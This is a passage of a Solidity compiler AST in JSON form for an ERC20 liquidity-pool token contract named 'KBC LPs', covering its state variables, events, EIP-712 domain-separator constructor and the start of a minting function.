							"src": "36:24:0"
						},
						{
							"absolutePath": "src/IERC20.sol",
							"file": "./IERC20.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 436,
							"sourceUnit": 534,
							"src": "62:22:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/SafeMath.sol",
							"file": "./SafeMath.sol",
							"id": 3,
							"nodeType": "ImportDirective",
							"scope": 436,
							"sourceUnit": 2269,
							"src": "85:24:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 4,
										"name": "IERC20",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 533,
										"src": "129:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IERC20_$533",
											"typeString": "contract IERC20"
										}
									},
									"id": 5,
									"nodeType": "InheritanceSpecifier",
									"src": "129:6:0"
								}
							],
							"contractDependencies": [
								533
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 435,
							"linearizedBaseContracts": [
								435,
								533
							],
							"name": "ERC20",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 8,
									"libraryName": {
										"contractScope": null,
										"id": 6,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2268,
										"src": "148:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$2268",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "142:27:0",
									"typeName": {
										"id": 7,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "161:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": true,
									"id": 11,
									"name": "name",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "175:39:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_memory",
										"typeString": "string"
									},
									"typeName": {
										"id": 9,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "175:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "4b4243204c5073",
										"id": 10,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "string",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "205:9:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_stringliteral_6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe",
											"typeString": "literal_string \"KBC LPs\""
										},
										"value": "KBC LPs"
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 14,
									"name": "symbol",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "220:40:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_memory",
										"typeString": "string"
									},
									"typeName": {
										"id": 12,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "220:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "4b42432d4c50",
										"id": 13,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "string",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "252:8:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_stringliteral_9878e19940d7064c845a25b9c0bf389acf4056353ef4909809f58f429b7f50da",
											"typeString": "literal_string \"KBC-LP\""
										},
										"value": "KBC-LP"
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 17,
									"name": "decimals",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "266:35:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint8",
										"typeString": "uint8"
									},
									"typeName": {
										"id": 15,
										"name": "uint8",
										"nodeType": "ElementaryTypeName",
										"src": "266:5:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint8",
											"typeString": "uint8"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "3138",
										"id": 16,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "299:2:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_18_by_1",
											"typeString": "int_const 18"
										},
										"value": "18"
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 19,
									"name": "totalSupply",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "307:26:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 18,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "307:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 23,
									"name": "balanceOf",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "339:44:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 22,
										"keyType": {
											"id": 20,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "347:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "339:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 21,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "358:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 29,
									"name": "allowance",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "389:64:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
										"typeString": "mapping(address => mapping(address => uint256))"
									},
									"typeName": {
										"id": 28,
										"keyType": {
											"id": 24,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "397:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "389:47:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
											"typeString": "mapping(address => mapping(address => uint256))"
										},
										"valueType": {
											"id": 27,
											"keyType": {
												"id": 25,
												"name": "address",
												"nodeType": "ElementaryTypeName",
												"src": "416:7:0",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												}
											},
											"nodeType": "Mapping",
											"src": "408:27:0",
											"typeDescriptions": {
												"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
												"typeString": "mapping(address => uint256)"
											},
											"valueType": {
												"id": 26,
												"name": "uint256",
												"nodeType": "ElementaryTypeName",
												"src": "427:7:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 33,
									"name": "_frozenBalance",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "459:49:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 32,
										"keyType": {
											"id": 30,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "467:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "459:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 31,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "478:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 35,
									"name": "DOMAIN_SEPARATOR",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "515:31:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes32",
										"typeString": "bytes32"
									},
									"typeName": {
										"id": 34,
										"name": "bytes32",
										"nodeType": "ElementaryTypeName",
										"src": "515:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes32",
											"typeString": "bytes32"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 38,
									"name": "PERMIT_TYPEHASH",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "656:116:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes32",
										"typeString": "bytes32"
									},
									"typeName": {
										"id": 36,
										"name": "bytes32",
										"nodeType": "ElementaryTypeName",
										"src": "656:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes32",
											"typeString": "bytes32"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "307836653731656461653132623162393766346431663630333730666566313031303566613266616165303132363131346131363963363438343564363132366339",
										"id": 37,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "706:66:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_49955707469362902507454157297736832118868343942642399513960811609542965143241_by_1",
											"typeString": "int_const 4995...(69 digits omitted)...3241"
										},
										"value": "0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9"
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 42,
									"name": "nonces",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "778:41:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 41,
										"keyType": {
											"id": 39,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "786:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "778:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 40,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "797:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 50,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 49,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 44,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 50,
												"src": "850:21:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 43,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "850:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 46,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 50,
												"src": "881:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 45,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "881:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 48,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 50,
												"src": "914:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 47,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "914:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "840:93:0"
									},
									"src": "826:108:0"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 58,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 57,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "954:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 51,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "954:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 54,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "976:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 53,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "976:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 56,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "996:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 55,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "996:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "953:57:0"
									},
									"src": "939:72:0"
								},
								{
									"body": {
										"id": 90,
										"nodeType": "Block",
										"src": "1038:464:0",
										"statements": [
											{
												"assignments": [
													62
												],
												"declarations": [
													{
														"constant": false,
														"id": 62,
														"name": "chainId",
														"nodeType": "VariableDeclaration",
														"scope": 90,
														"src": "1048:15:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 61,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1048:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 63,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "1048:15:0"
											},
											{
												"externalReferences": [
													{
														"chainId": {
															"declaration": 62,
															"isOffset": false,
															"isSlot": false,
															"src": "1096:7:0",
															"valueSize": 1
														}
													}
												],
												"id": 64,
												"nodeType": "InlineAssembly",
												"operations": "{ chainId := chainid() }",
												"src": "1073:51:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 88,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 65,
														"name": "DOMAIN_SEPARATOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 35,
														"src": "1133:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
																				"id": 70,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "string",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1234:84:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_stringliteral_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f",
																					"typeString": "literal_string \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\""
																				},
																				"value": "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_stringliteral_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f",
																					"typeString": "literal_string \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\""
																				}
																			],
																			"id": 69,
																			"name": "keccak256",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2319,
																			"src": "1203:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																				"typeString": "function (bytes memory) pure returns (bytes32)"
																			}
																		},
																		"id": 71,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1203:133:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 74,
																						"name": "name",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 11,
																						"src": "1370:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_string_memory",
																							"typeString": "string memory"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_string_memory",
																							"typeString": "string memory"
																						}
																					],
																					"id": 73,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "1364:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																						"typeString": "type(bytes storage pointer)"
																					},
																					"typeName": "bytes"
																				},
																				"id": 75,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1364:11:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			],
																			"id": 72,
																			"name": "keccak256",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2319,
																			"src": "1354:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																				"typeString": "function (bytes memory) pure returns (bytes32)"
																			}
																		},
																		"id": 76,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1354:22:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"hexValue": "31",
																						"id": 79,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "string",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "1410:3:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_stringliteral_c89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6",
																							"typeString": "literal_string \"1\""
																						},
																						"value": "1"
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_stringliteral_c89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6",
																							"typeString": "literal_string \"1\""
																						}
																					],
																					"id": 78,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "1404:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																						"typeString": "type(bytes storage pointer)"
																					},
																					"typeName": "bytes"
																				},
																				"id": 80,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1404:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			],
																			"id": 77,
																			"name": "keccak256",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2319,
																			"src": "1394:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																				"typeString": "function (bytes memory) pure returns (bytes32)"
																			}
																		},
																		"id": 81,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1394:21:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 82,
																		"name": "chainId",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 62,
																		"src": "1433:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 84,
																				"name": "this",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2343,
																				"src": "1466:4:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_contract$_ERC20_$435",
																					"typeString": "contract ERC20"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_contract$_ERC20_$435",
																					"typeString": "contract ERC20"
																				}
																			],
																			"id": 83,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "1458:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 85,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1458:13:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		},
																		{
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		},
																		{
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"id": 67,
																		"name": "abi",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2312,
																		"src": "1175:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_abi",
																			"typeString": "abi"
																		}
																	},
																	"id": 68,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"memberName": "encode",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "1175:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
																		"typeString": "function () pure returns (bytes memory)"
																	}
																},
																"id": 86,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1175:310:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															],
															"id": 66,
															"name": "keccak256",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2319,
															"src": "1152:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																"typeString": "function (bytes memory) pure returns (bytes32)"
															}
														},
														"id": 87,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1152:343:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"src": "1133:362:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"id": 89,
												"nodeType": "ExpressionStatement",
												"src": "1133:362:0"
											}
										]
									},
									"documentation": null,
									"id": 91,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 59,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1028:2:0"
									},
									"returnParameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1038:0:0"
									},
									"scope": 435,
									"src": "1017:485:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 124,
										"nodeType": "Block",
										"src": "1559:149:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 103,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 98,
														"name": "totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 19,
														"src": "1569:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 101,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 95,
																"src": "1599:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 99,
																"name": "totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 19,
																"src": "1583:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 100,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2217,
															"src": "1583:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 102,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1583:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1569:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 104,
												"nodeType": "ExpressionStatement",
												"src": "1569:36:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
